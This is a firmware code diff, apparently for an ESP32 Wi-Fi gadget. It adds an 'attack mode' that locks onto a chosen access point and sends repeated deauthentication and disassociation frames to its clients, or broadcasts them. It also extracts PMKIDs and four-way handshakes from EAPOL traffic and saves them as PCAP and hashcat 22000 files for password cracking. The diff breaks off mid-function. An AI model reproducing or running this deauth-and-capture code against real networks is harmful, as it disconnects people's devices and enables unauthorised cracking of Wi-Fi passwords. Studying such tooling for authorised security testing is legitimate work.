@@ -13,10 +13,14 @@
 #include "../core/heap_gates.h"
 #include "../core/heap_policy.h"
 #include "../core/xp.h"
+#include "../core/sd_layout.h"
+#include "../core/sdlog.h"
 #include "../ui/display.h"
+#include "../piglet/mood.h"
 #include "../hal/hal_input.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <SD.h>
 #include <esp_heap_caps.h>  // For heap_caps_get_largest_free_block
 #include <NimBLEDevice.h>   // For BLE coexistence check
 #include <algorithm>
@@ -33,10 +37,10 @@ const int SPECTRUM_WIDTH = 290;     // SPECTRUM_RIGHT - SPECTRUM_LEFT
 const int SPECTRUM_TOP = 3;         // Top margin (scaled)
 const int SPECTRUM_BOTTOM = 71;     // Lowered to give more vertical range (scaled)
 const int WATERFALL_TOP = 73;       // Waterfall starts here (scaled)
-const int WATERFALL_ROWS = 28;      // Number of history rows (scaled for height)
-const int WATERFALL_BOTTOM = 101;   // WATERFALL_TOP + WATERFALL_ROWS
-const int CHANNEL_LABEL_Y = 103;    // Channel number row (scaled)
-const int XP_BAR_Y = 118;           // Filter/status bar (scaled)
+const int WATERFALL_ROWS = 35;      // Number of history rows (extended with reclaimed gap space)
+const int WATERFALL_BOTTOM = 108;   // WATERFALL_TOP + WATERFALL_ROWS
+const int CHANNEL_LABEL_Y = 110;    // Channel number row (tight below waterfall)
+const int XP_BAR_Y = 120;           // Filter/status bar (just above bottom bar)
 
 // RSSI scale
 const int8_t RSSI_MIN = -95;        // Bottom of scale (weak signals)
@@ -201,6 +205,33 @@ bool SpectrumMode::revealingClients = false;
 uint32_t SpectrumMode::revealStartTime = 0;
 uint32_t SpectrumMode::lastRevealBurst = 0;
 
+// Attack mode state
+bool SpectrumMode::attackMode = false;
+uint8_t SpectrumMode::attackBSSID[6] = {0};
+uint8_t SpectrumMode::attackChannel = 0;
+uint32_t SpectrumMode::attackStartTime = 0;
+uint32_t SpectrumMode::lastAttackDeauth = 0;
+uint32_t SpectrumMode::deauthCount = 0;
+SpectrumPMKID SpectrumMode::capturedPMKIDs[4] = {};
+uint8_t SpectrumMode::capturedPMKIDCount = 0;
+volatile bool SpectrumMode::pendingAttackPMKID = false;
+volatile bool SpectrumMode::pendingAttackPMKIDSaved = false;
+SpectrumMode::PendingAttackPMKID SpectrumMode::attackPMKIDPool[4] = {};
+volatile uint8_t SpectrumMode::attackPmkidWrite = 0;
+volatile uint8_t SpectrumMode::attackPmkidRead = 0;
+
+// Beacon frame storage (shared across handshakes, single-BSSID attack)
+uint8_t SpectrumMode::attackBeaconBuf[SPECTRUM_MAX_BEACON_SIZE] = {};
+uint16_t SpectrumMode::attackBeaconLen = 0;
+volatile bool SpectrumMode::attackBeaconCaptured = false;
+
+// Handshake capture state
+SpectrumCapturedHandshake SpectrumMode::capturedHandshakes[SPECTRUM_HS_MAX] = {};
+uint8_t SpectrumMode::capturedHandshakeCount = 0;
+SpectrumMode::PendingHandshakeEntry SpectrumMode::pendingHandshakePool[SPECTRUM_HS_PENDING] = {};
+volatile uint8_t SpectrumMode::pendingHsWrite = 0;
+volatile uint8_t SpectrumMode::pendingHsRead = 0;
+
 static inline int8_t smoothIIR(int8_t current, int8_t sample, uint8_t alpha) {
     int16_t accum = (int16_t)current * (alpha - 1) + sample;
     return (int8_t)(accum / alpha);
@@ -319,44 +350,7 @@ void SpectrumMode::start() {
     startTime = millis();
     
     Display::setWiFiStatus(true);
-    Serial.printf("[SPECTRUM] Running - %d networks from recon\n", NetworkRecon::getNetworkCount());
-}
-
-void SpectrumMode::stop() {
-    if (!running) return;
-    
-    Serial.println("[SPECTRUM] Stopping...");
-    
-    // Block callback during shutdown sequence
-    busy = true;
-    
-    // Clear our packet callback (NetworkRecon keeps running)
-    NetworkRecon::setPacketCallback(nullptr);
-    
-    // [P4] Ensure monitoring is disabled
-    monitoringNetwork = false;
-    
-    // Unlock channel if we locked it
-    if (NetworkRecon::isChannelLocked()) {
-        NetworkRecon::unlockChannel();
-    }
-
-    // Clear spectrum-specific sweep override
-    NetworkRecon::clearHopIntervalOverride();
-    
-    running = false;
-    Display::setWiFiStatus(false);
-    
-    // FIX: Release vector capacity to recover heap
-    networks.clear();
-    networks.shrink_to_fit();
-    renderCount = 0;
-    memset(renderNets, 0, sizeof(renderNets));
-    memset(&renderSelected, 0, sizeof(renderSelected));
-    memset(&renderMonitor, 0, sizeof(renderMonitor));
-    
-    busy = false;
-    Serial.println("[SPECTRUM] Stopped - heap recovered");
+    Serial.printf("[SPECTRUM] Running - %d networks from recon\r\n", NetworkRecon::getNetworkCount());
 }
 
 void SpectrumMode::update() {
@@ -373,7 +367,7 @@ void SpectrumMode::update() {
     
     // Process deferred reveal logging (from callback)
     if (pendingReveal) {
-        Serial.printf("[SPECTRUM] Hidden SSID revealed: %s\n", pendingRevealSSID);
+        Serial.printf("[SPECTRUM] Hidden SSID revealed: %s\r\n", pendingRevealSSID);
         pendingReveal = false;
     }
     
@@ -500,7 +494,11 @@ void SpectrumMode::update() {
     
     // Prune stale networks periodically (only when NOT monitoring)
     if (!monitoringNetwork && now - lastUpdateTime > UPDATE_INTERVAL_MS) {
+        size_t sz = networks.size();
         pruneStale();
+        if (networks.empty() && sz > 0) {
+            Serial.printf("[SPECTRUM] ALL networks pruned! was %u, staleMs=%lu\r\n", sz, Config::wifi().spectrumStaleMs);
+        }
         lastUpdateTime = now;
     }
     
@@ -513,6 +511,11 @@ void SpectrumMode::update() {
     // Update reveal mode (periodic broadcast deauths)
     if (monitoringNetwork && revealingClients) {
         updateRevealMode();
+    }
+    
+    // Update attack mode (deauth loop + PMKID capture)
+    if (monitoringNetwork && attackMode) {
+        updateAttackMode();
     }
     
     // N13TZSCH3 achievement - stare into the ether for 15 minutes
@@ -542,7 +545,7 @@ void SpectrumMode::updateRenderSnapshot() {
     bool collapse = Config::wifi().spectrumCollapseSsid;
     uint32_t now = millis();
     uint32_t staleMs = Config::wifi().spectrumStaleMs;
-    if (staleMs < 1000) staleMs = 1000;
+    if (staleMs < 2000) staleMs = 2000;
     if (staleMs > 60000) staleMs = 60000;
 
     if (collapse && mergeSsidCount > 0) {
@@ -674,7 +677,11 @@ void SpectrumMode::updateRenderSnapshot() {
 void SpectrumMode::handleInput() {
     // [P11] Single state check at TOP - no fall-through!
     if (monitoringNetwork) {
-        handleClientMonitorInput();
+        if (attackMode) {
+            handleAttackInput();
+        } else {
+            handleClientMonitorInput();
+        }
         return;
     }
     
@@ -682,6 +689,30 @@ void SpectrumMode::handleInput() {
     
     if (!anyPressed) {
         keyWasPressed = false;
+        return;
+    }
+    
+    // Long-press RIGHT fires filter cycle (must be before keyWasPressed guard
+    // because keyWasPressed is set on first frame of press and never resets until release)
+    if (hal_input_isLongRight()) {
+        Display::resetDimTimer();
+        filter = static_cast<SpectrumFilter>((static_cast<int>(filter) + 1) % 4);
+        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
+            if (!matchesFilter(networks[selectedIndex])) {
+                int startIdx = selectedIndex;
+                int count = 0;
+                do {
+                    selectedIndex = (selectedIndex + 1) % (int)networks.size();
+                    count++;
+                } while (!matchesFilter(networks[selectedIndex]) && count < (int)networks.size());
+                if (!matchesFilter(networks[selectedIndex])) {
+                    selectedIndex = startIdx;
+                } else {
+                    viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
+                }
+            }
+        }
+        SFX::play(SFX::CLICK);
         return;
     }
     
@@ -746,10 +777,27 @@ void SpectrumMode::handleClientMonitorInput() {
         return;
     }
     
+    Display::resetDimTimer();
+    
+    // Long-press checks FIRST — they have their own one-shot (upLongFired/enterLongFired)
+    // and must not be blocked by the keyWasPressed short-press guard
+    
+    // Long-press ENTER: trigger reveal mode (broadcast deauth to discover hidden clients)
+    // Available even when clientCount == 0 — that's when you need it most!
+    if (hal_input_isLongEnter()) {
+        enterRevealMode();
+        return;
+    }
+    
+    // Long-press UP: trigger attack mode (targeted PMKID + handshake capture)
+    if (hal_input_isLongUp()) {
+        enterAttackMode();
+        return;
+    }
+    
+    // Short-press one-shot guard (prevents repeat actions while key is held)
     if (keyWasPressed) return;
     keyWasPressed = true;
-    
-    Display::resetDimTimer();
     
     // If detail popup is active, ENTER deauths client, any other key closes popup
     if (clientDetailActive) {
@@ -786,13 +834,6 @@ void SpectrumMode::handleClientMonitorInput() {
         }
         return;
     }
-    
-    // Long-press ENTER: trigger reveal mode (broadcast deauth to discover hidden clients)
-    // Available even when clientCount == 0 — that's when you need it most!
-    if (hal_input_isLongEnter()) {
-        enterRevealMode();
-        return;
-    }
 
     // Get client count safely
     int clientCount = 0;
@@ -825,6 +866,11 @@ void SpectrumMode::handleClientMonitorInput() {
             }
             return;
         }
+    } else {
+        // Dead input feedback — let user know UP/DOWN/ENTER do nothing with no clients
+        if (hal_input_wasPressed(KEY_UP) || hal_input_wasPressed(KEY_DOWN) || hal_input_wasPressed(KEY_ENTER)) {
+            Display::showToast("HOLD UP FOR ATTACK");
+        }
     }
 }
 
@@ -833,7 +879,11 @@ void SpectrumMode::draw(DisplayCanvas& canvas) {
     
     // Draw client overlay when monitoring, otherwise spectrum
     if (monitoringNetwork) {
-        drawClientOverlay(canvas);
+        if (attackMode) {
+            drawAttackOverlay(canvas);
+        } else {
+            drawClientOverlay(canvas);
+        }
     } else {
         // Draw spectrum visualization
         drawAxis(canvas);
@@ -1002,7 +1052,7 @@ void SpectrumMode::drawFilterBar(DisplayCanvas& canvas) {
             break;
     }
     
-    snprintf(buf, sizeof(buf), "[F] %s: %d %s", filterName, matchCount, suffix);
+    snprintf(buf, sizeof(buf), "[>>] %s: %d %s", filterName, matchCount, suffix);
     canvas.drawString(buf, 2, XP_BAR_Y);
     
     // Stress test indicator (right side)
@@ -1648,7 +1698,7 @@ void SpectrumMode::updateDialChannel() {
     
     uint32_t now = millis();
     uint32_t staleMs = Config::wifi().spectrumStaleMs;
-    if (staleMs < 1000) staleMs = 1000;
+    if (staleMs < 2000) staleMs = 2000;
     if (staleMs > 60000) staleMs = 60000;
     
     // ==[ READ IMU ]== accelerometer
@@ -1771,8 +1821,10 @@ void SpectrumMode::pruneStale() {
     
     uint32_t now = millis();
     uint32_t staleMs = Config::wifi().spectrumStaleMs;
-    if (staleMs < 1000) staleMs = 1000;
+    if (staleMs < 2000) staleMs = 2000;
     if (staleMs > 60000) staleMs = 60000;
+    
+    size_t before = networks.size();
     
     // Save BSSID of selected network before pruning
     uint8_t selectedBSSID[6] = {0};
@@ -1789,6 +1841,8 @@ void SpectrumMode::pruneStale() {
             }),
         networks.end()
     );
+    
+    size_t after = networks.size();
     
     // Restore selection by finding BSSID in new vector
     if (hadSelection) {
@@ -2016,6 +2070,15 @@ void SpectrumMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_p
     // BSSID is at offset 16
     const uint8_t* bssid = payload + 16;
     
+    // Capture beacon for target AP during attack mode (for PCAP export)
+    if (attackMode && !attackBeaconCaptured && frameType == 0x80) {
+        if (macEqual(bssid, attackBSSID) && len <= SPECTRUM_MAX_BEACON_SIZE) {
+            memcpy(attackBeaconBuf, payload, len);
+            attackBeaconLen = len;
+            attackBeaconCaptured = true;
+        }
+    }
+    
     // Parse SSID and DS channel from tagged parameters (starts at offset 36)
     char ssid[33] = {0};
     bool ssidFound = false;
@@ -2232,6 +2295,79 @@ void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t
     if (clientMac[0] & 0x01) return;
     
     trackClient(bssid, clientMac, rssi);
+    
+    // ========== EAPOL detection: PMKID + full handshake (attack mode only) ==========
+    if (!attackMode) return;
+    
+    // Parse LLC/SNAP header for EAPOL (same offset logic as OINK)
+    uint16_t offset = 24;
+    if (toDS && fromDS) offset += 6;
+    uint8_t subtype = (payload[0] >> 4) & 0x0F;
+    if (subtype & 0x08) offset += 2;  // QoS
+    if ((subtype & 0x08) && (payload[1] & 0x80)) offset += 4;  // HTC
+    if (offset + 8 > len) return;
+    
+    // LLC/SNAP: AA AA 03 00 00 00 88 8E
+    if (payload[offset] != 0xAA || payload[offset+1] != 0xAA ||
+        payload[offset+6] != 0x88 || payload[offset+7] != 0x8E) return;
+    
+    // EAPOL payload starts after LLC/SNAP (8 bytes)
+    const uint8_t* eapolPayload = payload + offset + 8;
+    uint16_t eapolLen = len - offset - 8;
+    if (eapolLen < 4) return;
+    
+    // Only EAPOL-Key (type 3)
+    if (eapolPayload[1] != 3) return;
+    if (eapolLen < 99) return;
+    
+    // Key info → determine message number
+    uint16_t keyInfo = (eapolPayload[5] << 8) | eapolPayload[6];
+    uint8_t keyAck = (keyInfo >> 7) & 0x01;
+    uint8_t keyMic = (keyInfo >> 8) & 0x01;
+    uint8_t install = (keyInfo >> 6) & 0x01;
+    uint8_t secure = (keyInfo >> 9) & 0x01;
+    
+    uint8_t messageNum = 0;
+    if (keyAck && !keyMic) messageNum = 1;
+    else if (!keyAck && keyMic && !secure) messageNum = 2;
+    else if (keyAck && keyMic && install) messageNum = 3;
+    else if (!keyAck && keyMic && secure) messageNum = 4;
+    
+    if (messageNum == 0) return;
+    
+    // ========== PMKID extraction from M1 ==========
+    if (messageNum == 1 && eapolPayload[4] == 0x02 && eapolLen >= 121) {
+        uint16_t keyDataLen = (eapolPayload[97] << 8) | eapolPayload[98];
+        if (keyDataLen >= 22 && eapolLen >= 99 + keyDataLen) {
+            const uint8_t* keyData = eapolPayload + 99;
+            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {
+                if (keyData[i] != 0xdd || keyData[i+1] != 0x14 ||
+                    keyData[i+2] != 0x00 || keyData[i+3] != 0x0f ||
+                    keyData[i+4] != 0xac || keyData[i+5] != 0x04) continue;
+                
+                const uint8_t* pmkidData = keyData + i + 6;
+                bool allZeros = true;
+                for (int z = 0; z < 16; z++) {
+                    if (pmkidData[z] != 0) { allZeros = false; break; }
+                }
+                if (allZeros) continue;
+                
+                char ssidBuf[33] = {0};
+                for (const auto& net : networks) {
+                    if (macEqual(net.bssid, bssid)) {
+                        strncpy(ssidBuf, net.ssid, 32);
+                        break;
+                    }
+                }
+                enqueueAttackPMKID(bssid, clientMac, pmkidData, ssidBuf);
+                break;
+            }
+        }
+    }
+    
+    // ========== Queue handshake frame for full capture ==========
+    queueHandshakeFrame(bssid, clientMac, eapolPayload, eapolLen,
+                        payload, len, messageNum, rssi);
 }
 
 // Track client connected to monitored network
@@ -2279,7 +2415,7 @@ void SpectrumMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, i
             pendingClientBeep = true;
         }
         
-        Serial.printf("[SPECTRUM] New client: %02X:%02X:%02X:%02X\n",
+        Serial.printf("[SPECTRUM] New client: %02X:%02X:%02X:%02X\r\n",
             clientMac[0], clientMac[1], clientMac[2],
             clientMac[3], clientMac[4], clientMac[5]);
     }
@@ -2331,7 +2467,7 @@ void SpectrumMode::enterClientMonitor() {
     // Short beep for channel lock - non-blocking
     SFX::play(SFX::CHANNEL_LOCK);
     
-    Serial.printf("[SPECTRUM] Monitoring %s on CH%d\n", 
+    Serial.printf("[SPECTRUM] Monitoring %s on CH%d\r\n", 
         net.ssid[0] ? net.ssid : "<hidden>", monitoredChannel);
     
     // NOW enable monitoring (after all state is ready) [P5]
@@ -2584,4 +2720,690 @@ void SpectrumMode::updateRevealMode() {
             // SFX handles reveal start sound
         }
     }
+}
+
+// ============================================================
+// ATTACK MODE — Manual BSSID-targeted PMKID capture
+// ============================================================
+
+bool SpectrumMode::enqueueAttackPMKID(const uint8_t* bssid, const uint8_t* station,
+                                      const uint8_t* pmkid, const char* ssid) {
+    uint8_t nextWrite = (attackPmkidWrite + 1) % ATTACK_PMKID_SLOTS;
+    if (nextWrite == attackPmkidRead) return false;  // Full
+
+    PendingAttackPMKID& slot = attackPMKIDPool[attackPmkidWrite];
+    memcpy(slot.bssid, bssid, 6);
+    memcpy(slot.station, station, 6);
+    memcpy(slot.pmkid, pmkid, 16);
+    strncpy(slot.ssid, ssid, 32);
+    slot.ssid[32] = '\0';
+
+    attackPmkidWrite = nextWrite;
+    return true;
+}
+
+bool SpectrumMode::dequeueAttackPMKID(PendingAttackPMKID& out) {
+    if (attackPmkidRead == attackPmkidWrite) return false;  // Empty
+
+    out = attackPMKIDPool[attackPmkidRead];
+    attackPmkidRead = (attackPmkidRead + 1) % ATTACK_PMKID_SLOTS;
+    return true;
+}
+
+// Queue a handshake frame from callback context (ISR-safe circular buffer)
+bool SpectrumMode::queueHandshakeFrame(const uint8_t* bssid, const uint8_t* station,
+                                        const uint8_t* eapolPayload, uint16_t eapolLen,
+                                        const uint8_t* fullFrame, uint16_t fullFrameLen,
+                                        uint8_t messageNum, int8_t rssi) {
+    if (messageNum < 1 || messageNum > 4) return false;
+    
+    // Scan existing slots for matching BSSID+station (accumulate frames)
+    uint8_t scanPos = pendingHsRead;
+    while (scanPos != pendingHsWrite) {
+        PendingHandshakeEntry& slot = pendingHandshakePool[scanPos];
+        if (macEqual(slot.bssid, bssid) && macEqual(slot.station, station)) {
+            // Found existing slot — add this frame
+            uint8_t fi = messageNum - 1;
+            uint16_t copyLen = (eapolLen < 128) ? eapolLen : 128;
+            memcpy(slot.frames[fi].data, eapolPayload, copyLen);
+            slot.frames[fi].len = copyLen;
+            uint16_t fullCopyLen = (fullFrameLen < 256) ? fullFrameLen : 256;
+            memcpy(slot.frames[fi].fullFrame, fullFrame, fullCopyLen);
+            slot.frames[fi].fullFrameLen = fullCopyLen;
+            slot.frames[fi].messageNum = messageNum;
+            slot.frames[fi].rssi = rssi;
+            slot.capturedMask |= (1 << fi);
+            return true;
+        }
+        scanPos = (scanPos + 1) % SPECTRUM_HS_PENDING;
+    }
+    
+    // No existing slot — allocate new one
+    uint8_t nextWrite = (pendingHsWrite + 1) % SPECTRUM_HS_PENDING;
+    if (nextWrite == pendingHsRead) return false;  // Buffer full
+    
+    PendingHandshakeEntry& slot = pendingHandshakePool[pendingHsWrite];
+    memcpy(slot.bssid, bssid, 6);
+    memcpy(slot.station, station, 6);
+    slot.capturedMask = 0;
+    memset(slot.frames, 0, sizeof(slot.frames));
+    
+    uint8_t fi = messageNum - 1;
+    uint16_t copyLen = (eapolLen < 128) ? eapolLen : 128;
+    memcpy(slot.frames[fi].data, eapolPayload, copyLen);
+    slot.frames[fi].len = copyLen;
+    uint16_t fullCopyLen = (fullFrameLen < 256) ? fullFrameLen : 256;
+    memcpy(slot.frames[fi].fullFrame, fullFrame, fullCopyLen);
+    slot.frames[fi].fullFrameLen = fullCopyLen;
+    slot.frames[fi].messageNum = messageNum;
+    slot.frames[fi].rssi = rssi;
+    slot.capturedMask |= (1 << fi);
+    
+    pendingHsWrite = nextWrite;
+    return true;
+}
+
+bool SpectrumMode::dequeueHandshakeFrame(PendingHandshakeEntry& out) {
+    if (pendingHsRead == pendingHsWrite) return false;
+    out = pendingHandshakePool[pendingHsRead];
+    pendingHsRead = (pendingHsRead + 1) % SPECTRUM_HS_PENDING;
+    return true;
+}
+
+void SpectrumMode::enterAttackMode() {
+    if (attackMode) return;
+    if (monitoredNetworkIndex < 0 || monitoredNetworkIndex >= (int)networks.size()) return;
+
+    const SpectrumNetwork& net = networks[monitoredNetworkIndex];
+
+    memcpy(attackBSSID, net.bssid, 6);
+    attackChannel = net.channel;
+    attackStartTime = millis();
+    lastAttackDeauth = 0;
+    deauthCount = 0;
+    capturedPMKIDCount = 0;
+    attackPmkidRead = 0;
+    attackPmkidWrite = 0;
+
+    // Clear any stale entries
+    memset(capturedPMKIDs, 0, sizeof(capturedPMKIDs));
+    memset((void*)attackPMKIDPool, 0, sizeof(attackPMKIDPool));
+    
+    // Clear handshake state
+    capturedHandshakeCount = 0;
+    memset(capturedHandshakes, 0, sizeof(capturedHandshakes));
+    pendingHsRead = 0;
+    pendingHsWrite = 0;
+    memset(pendingHandshakePool, 0, sizeof(pendingHandshakePool));
+    
+    // Clear beacon
+    attackBeaconLen = 0;
+    attackBeaconCaptured = false;
+    memset(attackBeaconBuf, 0, sizeof(attackBeaconBuf));
+
+    // Lock channel to target AP
+    NetworkRecon::lockChannel(attackChannel);
+
+    attackMode = true;
+    SFX::play(SFX::DEAUTH);
+    Mood::setStatusMessage("ATTACKING");
+
+    Serial.printf("[SPECTRUM] Attack started on %02x:%02x:%02x:%02x:%02x:%02x ch%d\r\n",
+                  attackBSSID[0], attackBSSID[1], attackBSSID[2],
+                  attackBSSID[3], attackBSSID[4], attackBSSID[5], attackChannel);
+}
+
+void SpectrumMode::exitAttackMode() {
+    if (!attackMode) return;
+
+    attackMode = false;
+
+    if (NetworkRecon::isChannelLocked()) {
+        NetworkRecon::unlockChannel();
+    }
+
+    Serial.printf("[SPECTRUM] Attack stopped — %lu deauths, %d PMKID(s), %d handshake(s)\r\n",
+                  deauthCount, capturedPMKIDCount, capturedHandshakeCount);
+}
+
+void SpectrumMode::updateAttackMode() {
+    if (!attackMode) return;
+
+    uint32_t now = millis();
+
+    // Dequeue any PMKIDs captured in the callback
+    PendingAttackPMKID p;
+    while (dequeueAttackPMKID(p)) {
+        if (capturedPMKIDCount < 4) {
+            SpectrumPMKID& slot = capturedPMKIDs[capturedPMKIDCount];
+            memcpy(slot.bssid, p.bssid, 6);
+            memcpy(slot.station, p.station, 6);
+            memcpy(slot.pmkid, p.pmkid, 16);
+            strncpy(slot.ssid, p.ssid, 32);
+            slot.ssid[32] = '\0';
+            slot.timestamp = millis();
+            slot.saved = false;
+            slot.saveAttempts = 0;
+            capturedPMKIDCount++;
+            SFX::play(SFX::PMKID);
+            Serial.printf("[SPECTRUM] PMKID #%d captured!\r\n", capturedPMKIDCount);
+        }
+    }
+
+    // Dequeue handshake frames and merge into captured handshakes
+    PendingHandshakeEntry hsEntry;
+    while (dequeueHandshakeFrame(hsEntry)) {
+        // Find existing handshake for this BSSID+station
+        int foundIdx = -1;
+        for (int i = 0; i < capturedHandshakeCount; i++) {
+            if (macEqual(capturedHandshakes[i].bssid, hsEntry.bssid) &&
+                macEqual(capturedHandshakes[i].station, hsEntry.station)) {
+                foundIdx = i;
+                break;
+            }
+        }
+        
+        SpectrumCapturedHandshake* hs = nullptr;
+        if (foundIdx >= 0) {
+            hs = &capturedHandshakes[foundIdx];
+        } else if (capturedHandshakeCount < SPECTRUM_HS_MAX) {
+            // Create new entry
+            hs = &capturedHandshakes[capturedHandshakeCount];
+            memcpy(hs->bssid, hsEntry.bssid, 6);
+            memcpy(hs->station, hsEntry.station, 6);
+            hs->capturedMask = 0;
+            hs->firstSeen = millis();
+            hs->saved = false;
+            hs->saveAttempts = 0;
+            memset(hs->frames, 0, sizeof(hs->frames));
+            // Look up SSID
+            hs->ssid[0] = '\0';
+            for (const auto& net : networks) {
+                if (macEqual(net.bssid, hsEntry.bssid)) {
+                    strncpy(hs->ssid, net.ssid, 32);
+                    hs->ssid[32] = '\0';
+                    break;
+                }
+            }
+            capturedHandshakeCount++;
+        }
+        
+        if (hs) {
+            // Merge frames from pending entry
+            for (int i = 0; i < 4; i++) {
+                if (hsEntry.capturedMask & (1 << i)) {
+                    memcpy(&hs->frames[i], &hsEntry.frames[i], sizeof(SpectrumEAPOLFrame));
+                    hs->capturedMask |= (1 << i);
+                }
+            }
+            hs->lastSeen = millis();
+            
+            if (hs->isComplete() && !hs->saved) {
+                SFX::play(SFX::PMKID);  // Reuse PMKID sound for handshake
+                Display::showToast("HANDSHAKE CAPTURED");
+                Serial.printf("[SPECTRUM] Handshake complete! mask=0x%02x pair=0x%02x\r\n",
+                              hs->capturedMask, hs->getMessagePair());
+            }
+        }
+    }
+
+    // Auto-save if we have unsaved captures
+    bool hasUnsaved = false;
+    for (uint8_t i = 0; i < capturedPMKIDCount; i++) {
+        if (!capturedPMKIDs[i].saved) { hasUnsaved = true; break; }
+    }
+    if (!hasUnsaved) {
+        for (uint8_t i = 0; i < capturedHandshakeCount; i++) {
+            if (capturedHandshakes[i].isComplete() && !capturedHandshakes[i].saved) {
+                hasUnsaved = true; break;
+            }
+        }
+    }
+    if (hasUnsaved) {
+        autoSaveCaptures();
+    }
+
+    // Deauth burst every 180ms (matches OINK timing)
+    if (now - lastAttackDeauth < 180) return;
+    lastAttackDeauth = now;
+
+    // Get client list for targeted deauths
+    int clientCount = 0;
+    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
+        clientCount = networks[monitoredNetworkIndex].clientCount;
+    }
+
+    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    if (clientCount > 0) {
+        // TARGETED deauth — up to 4 clients per cycle (matches OINK)
+        const SpectrumNetwork& net = networks[monitoredNetworkIndex];
+        int toDeauth = min(clientCount, 4);
+        for (int i = 0; i < toDeauth; i++) {
+            WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel,
+                                         net.clients[i].mac, 7);
+            deauthCount++;
+            delay(3);
+            // Also disassoc
+            WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel,
+                                         net.clients[i].mac, 2);
+            delay(3);
+        }
+    } else {
+        // BROADCAST deauth fallback (no clients known)
+        WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 7);
+        deauthCount++;
+        delay(3);
+        WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 2);
+    }
+}
+
+void SpectrumMode::handleAttackInput() {
+    // ESC: exit attack mode, return to client monitor
+    if (hal_input_wasPressed(KEY_ESC)) {
+        exitAttackMode();
+        return;
+    }
+
+    // LEFT: also exits attack
+    if (hal_input_wasPressed(KEY_LEFT)) {
+        exitAttackMode();
+        return;
+    }
+}
+
+// PCAP file format helpers
+#pragma pack(push, 1)
+struct PCAPHeader {
+    uint32_t magic;
+    uint16_t version_major;
+    uint16_t version_minor;
+    int32_t thiszone;
+    uint32_t sigfigs;
+    uint32_t snaplen;
+    uint32_t linktype;
+};
+
+struct PCAPPacketHeader {
+    uint32_t ts_sec;
+    uint32_t ts_usec;
+    uint32_t incl_len;
+    uint32_t orig_len;
+};
+#pragma pack(pop)
+
+static const uint8_t RADIOTAP_HEADER[] = {
+    0x00, 0x00,             // Revision + pad
+    0x08, 0x00,             // Length (8, LE)
+    0x00, 0x00, 0x00, 0x00  // Present flags (none)
+};
+
+void SpectrumMode::writePCAPHeader(File& f) {
+    PCAPHeader hdr = {
+        .magic = 0xA1B2C3D4,
+        .version_major = 2,
+        .version_minor = 4,
+        .thiszone = 0,
+        .sigfigs = 0,
+        .snaplen = 65535,
+        .linktype = 127  // LINKTYPE_IEEE802_11_RADIOTAP
+    };
+    f.write((uint8_t*)&hdr, sizeof(hdr));
+}
+
+void SpectrumMode::writePCAPPacket(File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
+    uint32_t totalLen = sizeof(RADIOTAP_HEADER) + len;
+    PCAPPacketHeader pkt = {
+        .ts_sec = ts / 1000,
+        .ts_usec = (ts % 1000) * 1000,
+        .incl_len = totalLen,
+        .orig_len = totalLen
+    };
+    f.write((uint8_t*)&pkt, sizeof(pkt));
+    f.write(RADIOTAP_HEADER, sizeof(RADIOTAP_HEADER));
+    f.write(data, len);
+}
+
+bool SpectrumMode::saveHandshakePCAP(const SpectrumCapturedHandshake& hs, const char* path) {
+    File f = SD.open(path, FILE_WRITE);
+    if (!f) return false;
+    
+    writePCAPHeader(f);
+    
+    // Write beacon first (required for hashcat)
+    if (attackBeaconCaptured && attackBeaconLen > 0) {
+        const uint8_t* beaconBssid = attackBeaconBuf + 16;
+        if (macEqual(beaconBssid, hs.bssid)) {
+            writePCAPPacket(f, attackBeaconBuf, attackBeaconLen, hs.firstSeen);
+        }
+    }
+    
+    // Write EAPOL frames
+    for (int i = 0; i < 4; i++) {
+        if (!(hs.capturedMask & (1 << i))) continue;
+        const SpectrumEAPOLFrame& frame = hs.frames[i];
+        if (frame.len == 0) continue;
+        
+        if (frame.fullFrameLen > 0 && frame.fullFrameLen <= 256) {
+            writePCAPPacket(f, frame.fullFrame, frame.fullFrameLen, frame.rssi);
+        } else {
+            // Fallback: reconstruct 802.11 frame from EAPOL payload
+            uint8_t pkt[300];
+            uint16_t pktLen = 0;
+            pkt[0] = 0x08;
+            pkt[2] = 0x00; pkt[3] = 0x00;
+            if (i == 0 || i == 2) {  // M1, M3: AP->Station
+                pkt[1] = 0x02;
+                memcpy(pkt + 4, hs.station, 6);
+                memcpy(pkt + 10, hs.bssid, 6);
+                memcpy(pkt + 16, hs.bssid, 6);
+            } else {  // M2, M4: Station->AP
+                pkt[1] = 0x01;
+                memcpy(pkt + 4, hs.bssid, 6);
+                memcpy(pkt + 10, hs.station, 6);
+                memcpy(pkt + 16, hs.bssid, 6);
+            }
+            pkt[22] = 0x00; pkt[23] = 0x00;
+            pktLen = 24;
+            pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
+            pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
+            pkt[30] = 0x88; pkt[31] = 0x8E;
+            pktLen = 32;
+            if (32 + frame.len > sizeof(pkt)) continue;
+            memcpy(pkt + 32, frame.data, frame.len);
+            pktLen += frame.len;
+            writePCAPPacket(f, pkt, pktLen, hs.firstSeen);
+        }
+    }
+    
+    f.close();
+    return true;
+}
+
+bool SpectrumMode::saveHandshake22000(const SpectrumCapturedHandshake& hs, const char* path) {
+    uint8_t msgPair = hs.getMessagePair();
+    if (msgPair == 0xFF) return false;
+    
+    const SpectrumEAPOLFrame* nonceFrame = nullptr;
+    const SpectrumEAPOLFrame* eapolFrame = nullptr;
+    if (msgPair == 0x00) {
+        nonceFrame = &hs.frames[0];  // M1
+        eapolFrame = &hs.frames[1];  // M2
+    } else {
+        nonceFrame = &hs.frames[2];  // M3
+        eapolFrame = &hs.frames[1];  // M2
+    }
+    
